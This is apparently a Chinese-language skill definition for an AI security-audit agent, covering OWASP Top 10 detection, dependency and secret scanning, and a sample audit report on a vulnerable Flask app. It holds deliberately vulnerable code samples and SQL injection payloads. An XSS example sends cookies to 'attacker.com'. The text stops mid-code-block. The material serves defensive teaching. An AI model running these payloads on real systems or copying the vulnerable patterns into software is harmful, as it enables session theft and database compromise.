---
name: 07-security-audit-G
description: Security audit expert for comprehensive security scanning and vulnerability detection. Supports OWASP Top 10 checks, CVE dependency scanning, sensitive data detection (API Keys/Secrets), CVSS scoring, compliance checks (GDPR/HIPAA/PCI-DSS). Use for pre-release security checks, periodic audits, compliance validation.
---

# security-audit - 安全审计专家

**版本**: 2.0.0
**优先级**: P0 (最高优先级)
**类别**: 质量与安全

---

## 描述

security-audit是一个专业的安全审计专家，提供全面的应用安全扫描和漏洞检测服务。深度检测OWASP Top 10漏洞（SQL注入、XSS、CSRF、认证缺陷等）、第三方依赖漏洞（CVE数据库）、敏感信息泄露（硬编码密钥、密码）、安全配置问题（CORS、HTTPS、Cookie安全）和合规性（GDPR、HIPAA、PCI-DSS）。采用多层扫描策略，结合静态代码分析（SAST）、依赖检查（SCA）和配置审查，为每个漏洞提供详细的修复方案、CVSS评分和验证方法，帮助开发团队快速定位并修复安全问题，构建安全可靠的应用系统。

---

## 核心能力

1. **OWASP Top 10检测**: 全面扫描注入、认证、加密、XSS、访问控制等10大类漏洞，提供CVSS评分
2. **依赖漏洞扫描**: 检查第三方库的已知CVE漏洞，支持Python (pip)、JavaScript (npm)、Java (Maven)
3. **敏感信息检测**: 识别硬编码的API密钥、密码、证书、私钥等敏感数据泄露
4. **安全配置审查**: 检查CORS、HTTPS、Cookie、HTTP头、认证配置等安全设置
5. **合规性检查**: 评估GDPR、HIPAA、PCI-DSS等标准的符合程度
6. **修复建议**: 为每个漏洞提供详细代码级修复方案和最佳实践

---

## Instructions

### 工作流程

#### 1. 扫描策略选择

根据用户需求和时间约束选择扫描深度：

**Quick扫描** (1-3分钟):
- OWASP Top 3: SQL注入、XSS、认证缺陷
- 敏感信息泄露（API密钥、密码）
- 关键依赖漏洞（仅Critical/High）
- 适用场景：开发中快速检查、PR审查

**Standard扫描** (5-10分钟，默认):
- OWASP Top 10完整检测
- 全部依赖漏洞扫描
- 敏感信息全面检测
- 基础安全配置审查
- 适用场景：提交前检查、CI/CD集成

**Deep扫描** (15-30分钟):
- Standard扫描所有内容
- 高级漏洞检测（竞态条件、逻辑漏洞）
- 合规性深度检查
- 安全架构评估
- 代码审计报告
- 适用场景：版本发布前、安全审计、渗透测试前

#### 2. OWASP Top 10漏洞检测

**A01:2021 - 权限控制失效 (Broken Access Control)**

检测项：
- 垂直权限提升（普通用户访问管理员功能）
- 水平权限提升（用户A访问用户B数据）
- IDOR (Insecure Direct Object Reference)
- 缺少权限检查的API端点

检测方法：
```python
# 扫描代码模式
patterns = [
    # 缺少权限检查
    r'@app\.route\([^)]+\)\s+def\s+\w+\([^)]*\):\s+(?!.*@require|.*check_permission)',

    # 直接使用用户ID访问数据
    r'User\.query\.get\(request\.args\.get\([\'"]id[\'"]\)\)',

    # 硬编码角色检查（应使用装饰器）
    r'if\s+user\.role\s*==\s*[\'"]admin[\'"]',
]
```

修复模式：
```python
# ❌ 错误：缺少权限检查
@app.route('/api/admin/users')
def get_all_users():
    return jsonify(User.query.all())

# ✅ 正确：添加角色检查装饰器
@app.route('/api/admin/users')
@require_role('admin')  # 装饰器检查
def get_all_users():
    return jsonify(User.query.all())

# ❌ 错误：IDOR漏洞
@app.route('/api/documents/<doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.query.get(doc_id)
    return jsonify(doc)  # 没检查文档是否属于当前用户

# ✅ 正确：资源所有权检查
@app.route('/api/documents/<doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.query.get(doc_id)
    if not doc:
        abort(404)
    if doc.owner_id != current_user.id:
        abort(403, "You don't have permission to access this document")
    return jsonify(doc)
```

**A02:2021 - 加密机制失效 (Cryptographic Failures)**

检测项：
- 明文存储密码
- 弱哈希算法（MD5、SHA1）
- 硬编码加密密钥
- 不安全的随机数生成

检测方法：
```python
# 危险模式
dangerous_patterns = {
    'weak_hash': r'hashlib\.(md5|sha1)\(',
    'plaintext_password': r'password\s*=\s*["\'][^"\']+["\']',
    'weak_random': r'random\.random\(\)',
    'hardcoded_key': r'SECRET_KEY\s*=\s*["\'][^"\']{8,}["\']',
}
```

修复示例：
```python
# ❌ 错误：MD5哈希密码
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# ✅ 正确：bcrypt哈希
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# ❌ 错误：弱随机数
import random
token = ''.join(random.choices(string.ascii_letters, k=32))

# ✅ 正确：密码学安全随机数
import secrets
token = secrets.token_urlsafe(32)

# ❌ 错误：硬编码密钥
SECRET_KEY = "my-super-secret-key-12345"

# ✅ 正确：环境变量
import os
SECRET_KEY = os.getenv('SECRET_KEY')
if not SECRET_KEY:
    raise ValueError("SECRET_KEY environment variable must be set")
```

**A03:2021 - 注入 (Injection)**

**SQL注入**:
```python
# 检测模式
sql_injection_patterns = [
    # 字符串拼接SQL
    r'["\']SELECT.*FROM.*WHERE.*\+.*["\']',
    r'f["\']SELECT.*{.*}.*["\']',

    # 不安全的execute
    r'execute\([\'"].*%s.*[\'"],\s*\(',
    r'cursor\.execute\(.*\.format\(',
]

# ❌ 危险代码
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id={user_id}"
cursor.execute(query)

# ✅ 安全代码
user_id = request.args.get('id')
query = "SELECT * FROM users WHERE id=?"
cursor.execute(query, (user_id,))

# SQLAlchemy (✅ 自动参数化)
user = User.query.filter(User.id == user_id).first()
```

**命令注入**:
```python
# ❌ 危险：直接拼接命令
import subprocess
filename = request.args.get('file')
subprocess.run(f"cat {filename}", shell=True)  # 命令注入风险

# ✅ 安全：使用参数列表 + 输入验证
import os
import subprocess
from pathlib import Path

filename = request.args.get('file')

# 1. 输入验证
allowed_path = Path('/safe/directory')
requested_path = (allowed_path / filename).resolve()
if not requested_path.is_relative_to(allowed_path):
    abort(400, "Invalid file path")

# 2. 不使用shell=True
subprocess.run(['cat', str(requested_path)], shell=False, check=True)
```

**A04:2021 - 不安全设计 (Insecure Design)**

检测项：
- 缺少速率限制
- 无限制资源消耗
- 缺少输入验证
- 业务逻辑漏洞

修复示例：
```python
# ❌ 错误：无速率限制的登录
@app.route('/api/login', methods=['POST'])
def login():
    # 可暴力破解
    user = authenticate(request.json['email'], request.json['password'])
    return create_token(user)

# ✅ 正确：添加速率限制
from flask_limiter import Limiter

limiter = Limiter(
    app,
    key_func=lambda: request.remote_addr,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")  # 每分钟最多5次
def login():
    email = request.json.get('email')
    password = request.json.get('password')

    # 输入验证
    if not email or not password:
        abort(400, "Email and password required")

    user = authenticate(email, password)
    if not user:
        # 记录失败尝试
        log_failed_login(email, request.remote_addr)
        abort(401, "Invalid credentials")

    return create_token(user)
```

**A05:2021 - 安全配置错误 (Security Misconfiguration)**

检测项：
- DEBUG模式在生产环境启用
- 默认账户/密码未修改
- 不必要的服务/端口开放
- 缺少安全HTTP头

检测和修复：
```python
# ❌ 错误配置
app.config['DEBUG'] = True  # 生产环境泄露敏感信息
app.config['SECRET_KEY'] = 'default'  # 默认密钥
ALLOWED_HOSTS = ['*']  # 允许任意host

# ✅ 正确配置
import os

# 环境感知配置
ENV = os.getenv('FLASK_ENV', 'production')
app.config['DEBUG'] = (ENV == 'development')

# 强密钥
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY')

# 限制允许的host
ALLOWED_HOSTS = os.getenv('ALLOWED_HOSTS', 'example.com').split(',')

# 安全HTTP头
from flask import Flask, make_response

@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

**A06:2021 - 易受攻击和过时的组件**

使用`pip-audit`、`npm audit`扫描依赖：
```bash
# Python
pip-audit --format json > vulnerabilities.json

# JavaScript
npm audit --json > npm-vulnerabilities.json

# 自动修复
pip-audit --fix
npm audit fix
```

**A07:2021 - 身份识别和身份验证错误**

检测项：
- 弱密码策略
- 缺少多因素认证（MFA）
- Session管理不当
- 密码重置漏洞

修复示例：
```python
# ❌ 弱密码验证
def validate_password(password):
    return len(password) >= 6

# ✅ 强密码验证
import re
from collections import Counter

def validate_password(password):
    """
    密码要求：
    - 至少12字符
    - 大小写字母、数字、特殊字符
    - 不包含常见密码
    - 无重复字符过多
    """
    errors = []

    if len(password) < 12:
        errors.append("密码至少12字符")

    if not re.search(r'[A-Z]', password):
        errors.append("必须包含大写字母")

    if not re.search(r'[a-z]', password):
        errors.append("必须包含小写字母")

    if not re.search(r'\d', password):
        errors.append("必须包含数字")

    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        errors.append("必须包含特殊字符")

    # 检查常见密码
    if password.lower() in load_common_passwords():
        errors.append("密码过于常见")

    # 检查重复字符
    char_counts = Counter(password)
    if any(count > len(password) / 3 for count in char_counts.values()):
        errors.append("密码包含过多重复字符")

    if errors:
        raise ValueError("; ".join(errors))

    return True

# Session安全配置
app.config.update(
    SESSION_COOKIE_SECURE=True,      # 仅HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # 防JS访问
    SESSION_COOKIE_SAMESITE='Lax',   # CSRF防护
    PERMANENT_SESSION_LIFETIME=3600,  # 1小时过期
)
```

**A08:2021 - 软件和数据完整性故障**

检测项：
- 不验证软件更新签名
- 反序列化不受信数据
- 缺少CI/CD管道安全检查

危险模式：
```python
# ❌ 危险：pickle反序列化
import pickle
data = pickle.loads(request.data)  # 任意代码执行

# ✅ 安全：使用JSON
import json
data = json.loads(request.data)

# ❌ 危险：eval执行用户输入
result = eval(request.args.get('expression'))

# ✅ 安全：使用安全的表达式求值器
from ast import literal_eval
result = literal_eval(expression)  # 仅支持字面量
```

**A09:2021 - 安全日志和监控故障**

检测项：
- 关键操作无日志
- 日志中包含敏感信息
- 缺少异常监控和告警

修复示例：
```python
import logging
from functools import wraps

# 配置安全日志
logging.basicConfig(
    filename='security.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s'
)

def audit_log(action):
    """审计日志装饰器"""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            user_id = getattr(current_user, 'id', 'anonymous')
            ip_address = request.remote_addr

            try:
                result = f(*args, **kwargs)

                # 成功日志
                logging.info(
                    f"Action: {action} | User: {user_id} | IP: {ip_address} | Status: SUCCESS"
                )

                return result

            except Exception as e:
                # 失败日志（不记录敏感信息）
                logging.warning(
                    f"Action: {action} | User: {user_id} | IP: {ip_address} | "
                    f"Status: FAILED | Error: {type(e).__name__}"
                )
                raise

        return wrapper
    return decorator

# 使用示例
@app.route('/api/admin/delete-user/<user_id>', methods=['DELETE'])
@require_role('admin')
@audit_log('delete_user')
def delete_user(user_id):
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return {'message': 'User deleted'}
```

**A10:2021 - 服务端请求伪造 (SSRF)**

检测和修复：
```python
# ❌ 危险：无验证的URL请求
import requests

@app.route('/api/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # SSRF风险
    return response.content

# ✅ 安全：URL白名单 + 验证
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

def is_safe_url(url):
    """验证URL是否安全"""
    try:
        parsed = urlparse(url)

        # 1. 检查协议
        if parsed.scheme not in ['http', 'https']:
            return False, "仅支持HTTP/HTTPS协议"

        # 2. 检查域名白名单
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False, f"域名不在白名单: {parsed.hostname}"

        # 3. 防止内网访问
        try:
            ip = ipaddress.ip_address(parsed.hostname)
            if ip.is_private or ip.is_loopback:
                return False, "禁止访问内网地址"
        except ValueError:
            pass  # 不是IP地址，跳过

        return True, None

    except Exception as e:
        return False, str(e)

@app.route('/api/fetch')
def fetch_url():
    url = request.args.get('url')

    is_safe, error = is_safe_url(url)
    if not is_safe:
        abort(400, error)

    response = requests.get(url, timeout=5)
    return response.content
```

#### 3. 依赖漏洞扫描

**Python依赖扫描**:
```python
import subprocess
import json

def scan_python_dependencies():
    """扫描Python依赖漏洞"""
    result = subprocess.run(
        ['pip-audit', '--format', 'json'],
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        vulnerabilities = json.loads(result.stdout)

        for vuln in vulnerabilities.get('vulnerabilities', []):
            yield {
                'package': vuln['name'],
                'version': vuln['version'],
                'cve': vuln.get('id', 'N/A'),
                'severity': vuln.get('severity', 'UNKNOWN'),
                'description': vuln.get('description', ''),
                'fix': vuln.get('fix_versions', [])
            }
```

**JavaScript依赖扫描**:
```bash
# 扫描并生成报告
npm audit --json | jq '.vulnerabilities' > vulnerabilities.json

# 自动修复
npm audit fix

# 强制修复（可能破坏兼容性）
npm audit fix --force
```

#### 4. 敏感信息检测

**检测模式**:
```python
import re

SECRETS_PATTERNS = {
    'aws_access_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret_key': r'[0-9a-zA-Z/+]{40}',
    'github_token': r'gh[pousr]_[A-Za-z0-9_]{36,251}',
    'slack_token': r'xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[0-9A-Za-z]{24,32}',
    'openai_api_key': r'sk-[a-zA-Z0-9]{48}',
    'stripe_api_key': r'sk_(live|test)_[0-9a-zA-Z]{24,}',
    'private_key': r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
    'generic_api_key': r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{32,})["\']',
    'password': r'password["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
}

def scan_secrets(file_path):
    """扫描文件中的敏感信息"""
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    findings = []
    for secret_type, pattern in SECRETS_PATTERNS.items():
        matches = re.finditer(pattern, content)
        for match in matches:
            # 计算行号
            line_num = content[:match.start()].count('\n') + 1

            findings.append({
                'type': secret_type,
                'file': file_path,
                'line': line_num,
                'matched': match.group(0)[:20] + '...',  # 只显示前20字符
                'severity': 'CRITICAL'
            })

    return findings
```

#### 5. 安全配置审查

**CORS配置检查**:
```python
# ❌ 危险配置
CORS(app, origins="*", supports_credentials=True)

# ✅ 安全配置
CORS(app,
     origins=["https://example.com"],  # 明确指定域名
     supports_credentials=True,
     allow_headers=["Content-Type", "Authorization"],
     max_age=3600)
```

**Cookie安全检查**:
```python
# 检查清单
cookie_security_checks = {
    'SESSION_COOKIE_SECURE': True,       # ✅ 必须
    'SESSION_COOKIE_HTTPONLY': True,     # ✅ 必须
    'SESSION_COOKIE_SAMESITE': 'Lax',    # ✅ 推荐
    'PERMANENT_SESSION_LIFETIME': 3600,   # ✅ 设置过期时间
}
```

#### 6. 生成安全报告

**报告结构**:
```
1. 执行摘要
   - 整体安全评分 (0-100)
   - 漏洞统计（Critical/High/Medium/Low）
   - 风险等级分布图

2. 关键发现
   - Top 10 严重漏洞
   - 每个漏洞的详细信息：
     * 漏洞类型和CWE编号
     * 影响范围和CVSS评分
     * 受影响的代码位置
     * 攻击向量示例
     * 详细修复方案
     * 验证方法

3. 依赖漏洞清单
   - CVE编号、严重程度
   - 受影响的包和版本
   - 修复版本建议

4. 合规性评估
   - GDPR合规检查结果
   - HIPAA合规检查结果
   - 不符合项和改进建议

5. 修复优先级路线图
   - P0 (紧急): 必须立即修复
   - P1 (高): 1周内修复
   - P2 (中): 1月内修复
   - P3 (低): 技术债务
```

---

## 输入参数

| 参数 | 类型 | 必需 | 默认值 | 说明 |
|------|------|------|--------|------|
| code_path | string | 是 | - | 代码路径（目录或文件） |
| scan_depth | string | 否 | standard | 扫描深度: quick/standard/deep |
| scan_types | string[] | 否 | all | 扫描类型: owasp/dependencies/secrets/config/compliance |
| exclude_paths | string[] | 否 | [] | 排除路径（如node_modules、venv） |
| compliance_standard | string | 否 | - | 合规标准: gdpr/hipaa/pci-dss |
| severity_threshold | string | 否 | low | 报告严重性阈值: critical/high/medium/low |
| output_format | string | 否 | json | 输出格式: json/markdown/html/sarif |
| include_fix_snippets | boolean | 否 | true | 是否包含修复代码片段 |

---

## 输出格式

```typescript
interface SecurityAuditOutput {
  overall_score: number;              // 0-100整体安全评分
  scan_metadata: {
    timestamp: string;                // ISO 8601格式
    scan_depth: 'quick' | 'standard' | 'deep';
    files_scanned: number;
    lines_scanned: number;
    duration_seconds: number;
  };
  summary: {
    total_issues: number;
    critical_count: number;
    high_count: number;
    medium_count: number;
    low_count: number;
    fixed_issues?: number;            // 自动修复的问题数
  };
  critical_issues: SecurityIssue[];
  high_issues: SecurityIssue[];
  medium_issues: SecurityIssue[];
  low_issues: SecurityIssue[];
  dependency_vulnerabilities: DependencyVulnerability[];
  secrets_found: SecretsFinding[];
  compliance_status?: ComplianceStatus;
  remediation_plan: RemediationTask[];
}

interface SecurityIssue {
  id: string;                        // 唯一标识符
  severity: 'critical' | 'high' | 'medium' | 'low';
  category: string;                  // OWASP分类: A01-A10
  cwe_id?: string;                   // CWE编号 (如CWE-89)
  cvss_score?: number;               // CVSS评分 (0-10)
  title: string;
  description: string;
  file_path: string;
  line_number: number;
  code_snippet: string;              // 有问题的代码
  impact: string;                    // 潜在影响描述
  exploit_example?: string;          // 攻击示例
  fix_recommendation: string;
  fix_code_snippet?: string;         // 修复后的代码
  verification_method?: string;      // 如何验证修复
  references: string[];              // 相关文档链接
}

interface DependencyVulnerability {
  package_name: string;
  current_version: string;
  cve_id: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  fixed_in_versions: string[];
  cvss_score: number;
  published_date: string;
}

interface SecretsFinding {
  type: string;                      // api_key, password, token等
  file_path: string;
  line_number: number;
  matched_pattern: string;           // 脱敏后的匹配内容
  severity: 'critical';
  recommendation: string;
}

interface ComplianceStatus {
  standard: 'gdpr' | 'hipaa' | 'pci-dss';
  overall_compliance: number;        // 0-100百分比
  compliant_items: string[];
  non_compliant_items: ComplianceIssue[];
}

interface ComplianceIssue {
  requirement_id: string;            // 如GDPR Art. 32
  requirement_description: string;
  current_status: string;
  gap_analysis: string;
  remediation_steps: string[];
}

interface RemediationTask {
  priority: 'P0' | 'P1' | 'P2' | 'P3';
  issue_ids: string[];               // 关联的问题ID
  title: string;
  estimated_effort: string;          // 如"2 hours", "1 day"
  steps: string[];
  blocking_issues?: string[];        // 依赖的其他任务
}
```

---


---

## TypeScript接口

### 基础输出接口

所有Skill的输出都继承自`BaseOutput`统一接口：

```typescript
interface BaseOutput {
  success: boolean;
  error?: {
    code: string;
    message: string;
    suggestedFix?: string;
  };
  metadata?: {
    requestId: string;
    timestamp: string;
    version: string;
  };
  warnings?: Array<{
    code: string;
    message: string;
    severity: 'low' | 'medium' | 'high';
  }>;
}
```

### 输入接口

```typescript
interface SecurityAuditInput {
}
```

### 输出接口

```typescript
interface SecurityAuditOutput extends BaseOutput {
  success: boolean;          // 来自BaseOutput
  error?: ErrorInfo;         // 来自BaseOutput
  metadata?: Metadata;       // 来自BaseOutput
  warnings?: Warning[];      // 来自BaseOutput

  // ... 其他业务字段
}
```

---

## Examples

### 示例1: Web应用全面安全审计

**用户请求**:
> "对我的Flask应用进行深度安全审计，检查OWASP Top 10和GDPR合规性"

**项目结构**:
```
flask-app/
├── app/
│   ├── __init__.py
│   ├── models.py
│   ├── auth.py
│   ├── api/
│   │   ├── users.py
│   │   └── admin.py
│   └── templates/
│       └── profile.html
├── config.py
├── requirements.txt
└── .env.example
```

**发现的漏洞代码示例**:

**app/api/users.py** (SQL注入):
```python
from flask import Blueprint, request, jsonify
import sqlite3

bp = Blueprint('users', __name__)

@bp.route('/search')
def search_users():
    # ❌ SQL注入漏洞
    search_term = request.args.get('q')
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    # 危险：直接拼接用户输入
    query = f"SELECT * FROM users WHERE username LIKE '%{search_term}%'"
    cursor.execute(query)

    results = cursor.fetchall()
    conn.close()

    return jsonify(results)
```

**app/templates/profile.html** (XSS):
```html
<!DOCTYPE html>
<html>
<head>
    <title>User Profile</title>
</head>
<body>
    <h1>{{ user.username }}</h1>

    <!-- ❌ XSS漏洞：未转义用户输入 -->
    <div class="bio">
        {{ user.bio | safe }}  <!-- |safe 关闭自动转义 -->
    </div>

    <script>
        // ❌ DOM-based XSS
        var userName = "{{ user.username }}";  // 未转义插入JS
        document.getElementById('greeting').innerHTML =
            "Welcome, " + userName;  // innerHTML可执行脚本
    </script>
</body>
</html>
```

**config.py** (敏感信息泄露):
```python
import os

class Config:
    # ❌ 硬编码密钥
    SECRET_KEY = "super-secret-key-12345"

    # ❌ 硬编码数据库密码
    SQLALCHEMY_DATABASE_URI = "postgresql://admin:password123@localhost/mydb"

    # ❌ 硬编码API密钥
    OPENAI_API_KEY = "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"

    # ❌ DEBUG模式（生产环境危险）
    DEBUG = True

    # ❌ 不安全的Cookie配置
    SESSION_COOKIE_SECURE = False
    SESSION_COOKIE_HTTPONLY = False
```

**app/auth.py** (弱认证):
```python
from flask import Blueprint, request, jsonify
import hashlib

bp = Blueprint('auth', __name__)

@bp.route('/register', methods=['POST'])
def register():
    data = request.json

    # ❌ 弱密码验证
    if len(data['password']) < 6:
        return jsonify({'error': 'Password too short'}), 400

    # ❌ MD5哈希（已被破解）
    password_hash = hashlib.md5(data['password'].encode()).hexdigest()

    # 保存用户...
    return jsonify({'message': 'User created'})

@bp.route('/login', methods=['POST'])
def login():
    # ❌ 无速率限制（可暴力破解）
    data = request.json
    user = User.query.filter_by(email=data['email']).first()

    if user and user.password_hash == hashlib.md5(data['password'].encode()).hexdigest():
        # 创建session...
        return jsonify({'token': 'abc123'})

    return jsonify({'error': 'Invalid credentials'}), 401
```

**Skill执行**:
```python
result = security_audit_skill.execute({
    "code_path": "./flask-app",
    "scan_depth": "deep",
    "scan_types": ["owasp", "dependencies", "secrets", "config", "compliance"],
    "exclude_paths": ["venv", "__pycache__", "*.pyc"],
    "compliance_standard": "gdpr",
    "output_format": "markdown",
    "include_fix_snippets": True
})
```

**生成的安全审计报告** (部分):
```markdown
# 安全审计报告

**应用名称**: Flask Web Application
**扫描时间**: 2025-12-12 12:00:00 UTC
**扫描深度**: Deep
**扫描文件**: 25个文件，3,500行代码
**扫描时长**: 18分钟

---

## 执行摘要

**整体安全评分**: <span style="color: red; font-weight: bold;">42/100</span> ❌ 严重不足

**风险等级**: 🔴 **CRITICAL** - 应用存在严重安全漏洞，建议立即修复后再部署

### 漏洞统计

| 严重程度 | 数量 | 占比 |
|----------|------|------|
| 🔴 Critical | 8 | 32% |
| 🟠 High | 12 | 48% |
| 🟡 Medium | 5 | 20% |
| ⚪ Low | 0 | 0% |
| **总计** | **25** | **100%** |

### 漏洞分布（OWASP Top 10）

```
A01 权限控制失效      ████████ 3个
A02 加密机制失效      ████████████ 4个
A03 注入             ████████████ 4个
A04 不安全设计        ████ 2个
A05 安全配置错误      ██████████████ 5个
A07 身份验证错误      ██████ 3个
A08 软件完整性故障    ████ 2个
A09 日志监控故障      ████ 2个
```

---

## 🔴 严重漏洞 (Critical) - 8个

### 1. SQL注入漏洞 [CWE-89] [A03:2021]

**CVSS评分**: 9.8 (Critical)

**文件位置**: `app/api/users.py:12`

**漏洞代码**:
```python
# Line 12-17
search_term = request.args.get('q')
query = f"SELECT * FROM users WHERE username LIKE '%{search_term}%'"
cursor.execute(query)
```

**风险描述**:
应用直接将用户输入拼接到SQL查询中，没有任何过滤或参数化。攻击者可以通过构造恶意输入执行任意SQL命令，导致：
- 数据泄露（获取所有用户数据）
- 数据篡改（修改或删除记录）
- 权限提升（创建管理员账户）
- 完整数据库接管

**攻击示例**:
```bash
# 正常查询
GET /search?q=john

# 恶意查询 - 获取所有用户
GET /search?q=' OR '1'='1

# 执行的SQL
SELECT * FROM users WHERE username LIKE '%' OR '1'='1%'  # 返回所有用户

# 更危险 - 删除表
GET /search?q='; DROP TABLE users; --

# 执行的SQL
SELECT * FROM users WHERE username LIKE '%'; DROP TABLE users; --%'
```

**修复方案**:

**方案1: 使用参数化查询** (推荐)
```python
@bp.route('/search')
def search_users():
    search_term = request.args.get('q', '')

    # ✅ 安全：参数化查询
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    query = "SELECT id, username, email FROM users WHERE username LIKE ?"
    cursor.execute(query, (f'%{search_term}%',))  # 参数作为tuple传递

    results = cursor.fetchall()
    conn.close()

    return jsonify([
        {'id': r[0], 'username': r[1], 'email': r[2]}
        for r in results
    ])
```

**方案2: 使用ORM** (最佳实践)
```python
from app.models import User

@bp.route('/search')
def search_users():
    search_term = request.args.get('q', '')

    # ✅ 安全：SQLAlchemy自动参数化
    users = User.query.filter(
        User.username.like(f'%{search_term}%')
    ).all()

    return jsonify([
        {'id': u.id, 'username': u.username, 'email': u.email}
        for u in users
    ])
```

**验证修复**:
```bash
# 1. 运行sqlmap检测
sqlmap -u "http://localhost:5000/search?q=test" --batch

# 修复前：检测到SQL注入
# 修复后：无漏洞

# 2. 手动测试注入payload
curl "http://localhost:5000/search?q=' OR '1'='1"

# 修复后应返回正常搜索结果或空结果，不是所有用户
```

---

### 2. 跨站脚本攻击 (XSS) [CWE-79] [A03:2021]

**CVSS评分**: 7.3 (High)

**文件位置**: `app/templates/profile.html:8-10`

**漏洞代码**:
```html
<!-- Line 8-10 -->
<div class="bio">
    {{ user.bio | safe }}  <!-- 关闭自动转义 -->
</div>
```

**风险描述**:
应用使用`| safe`过滤器关闭了Jinja2的自动HTML转义，允许用户提交的bio字段中的任意HTML和JavaScript代码在其他用户浏览器中执行。攻击者可以：
- 窃取其他用户的Cookie和Session
- 执行未授权操作（如修改资料、发送消息）
- 重定向到钓鱼网站
- 键盘记录

**攻击示例**:
```javascript
// 攻击者在bio字段提交：
<script>
  // 窃取Cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);

  // 或执行操作
  fetch('/api/transfer', {
    method: 'POST',
    body: JSON.stringify({to: 'attacker', amount: 1000}),
    headers: {'Content-Type': 'application/json'}
  });
</script>

// 受害者访问攻击者的profile页面时，脚本自动执行
```

**修复方案**:

**方案1: 移除|safe，使用自动转义** (推荐)
```html
<!-- ✅ 安全：自动转义 -->
<div class="bio">
    {{ user.bio }}  <!-- Jinja2自动转义HTML -->
</div>

<!-- 用户输入：<script>alert('XSS')</script> -->
<!-- 渲染为：&lt;script&gt;alert('XSS')&lt;/script&gt; -->
```

**方案2: 使用白名单HTML清理** (如需支持富文本)
```python
from bleach import clean

ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li']
ALLOWED_ATTRIBUTES = {'a': ['href', 'title']}

@bp.route('/update_profile', methods=['POST'])
def update_profile():
    bio = request.json.get('bio', '')

    # ✅ 清理HTML，仅保留安全标签
    safe_bio = clean(
        bio,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )

    current_user.bio = safe_bio
    db.session.commit()

    return jsonify({'message': 'Profile updated'})
```

**方案3: Content Security Policy (CSP) 深度防御**
```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "  # 禁止内联脚本
        "object-src 'none'; "
        "base-uri 'self'"
    )
    return response
```

**验证修复**:
```python
# 测试用例
import pytest
from app import create_app

def test_xss_protection():
    app = create_app()
    client = app.test_client()

    # 提交XSS payload
    response = client.post('/update_profile', json={
        'bio': '<script>alert("XSS")</script>Hello'
    })

    assert response.status_code == 200

    # 获取profile页面
    response = client.get('/profile/1')
    html = response.data.decode()

    # 验证脚本被转义或移除
    assert '<script>' not in html
    assert 'alert(' not in html
    assert '&lt;script&gt;' in html or 'Hello' in html
```

---

### 3. 硬编码敏感信息 [CWE-798] [A02:2021]

**CVSS评分**: 9.1 (Critical)

**文件位置**: `config.py:5-10`

**漏洞代码**:
```python
SECRET_KEY = "super-secret-key-12345"
SQLALCHEMY_DATABASE_URI = "postgresql://admin:password123@localhost/mydb"
OPENAI_API_KEY = "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"
```

**风险描述**:
敏感密钥和凭证硬编码在代码中，一旦代码被泄露（Git仓库、日志、错误信息），攻击者可以：
- 伪造Session和JWT token
- 直接访问数据库
- 使用API密钥产生费用或窃取数据
- 完全接管应用

**修复方案**:

**步骤1: 将密钥移至环境变量**
```python
# config.py
import os
from dotenv import load_dotenv

load_dotenv()  # 加载.env文件

class Config:
    # ✅ 从环境变量读取
    SECRET_KEY = os.getenv('SECRET_KEY')
    if not SECRET_KEY:
        raise ValueError("SECRET_KEY environment variable is required")

    SQLALCHEMY_DATABASE_URI = os.getenv('DATABASE_URL')
    if not SQLALCHEMY_DATABASE_URI:
        raise ValueError("DATABASE_URL environment variable is required")

    OPENAI_API_KEY = os.getenv('OPENAI_API_KEY')
```

**步骤2: 创建.env文件 (不提交到Git)**
```bash
# .env
SECRET_KEY=randomly-generated-secret-key-here
DATABASE_URL=postgresql://admin:strong-password@localhost/mydb
OPENAI_API_KEY=sk-proj-your-actual-key
```

**步骤3: 添加到.gitignore**
```
# .gitignore
.env
*.env
config_secrets.py
```

**步骤4: 提供.env.example模板**
```bash
# .env.example (提交到Git)
SECRET_KEY=change-me
DATABASE_URL=postgresql://user:password@localhost/dbname
OPENAI_API_KEY=sk-proj-xxxxx
```

**步骤5: 立即轮换已泄露的密钥**
```bash
# 生成新的SECRET_KEY
python -c "import secrets; print(secrets.token_urlsafe(32))"

# 重置数据库密码
psql -U admin -d mydb -c "ALTER USER admin WITH PASSWORD 'new-strong-password';"

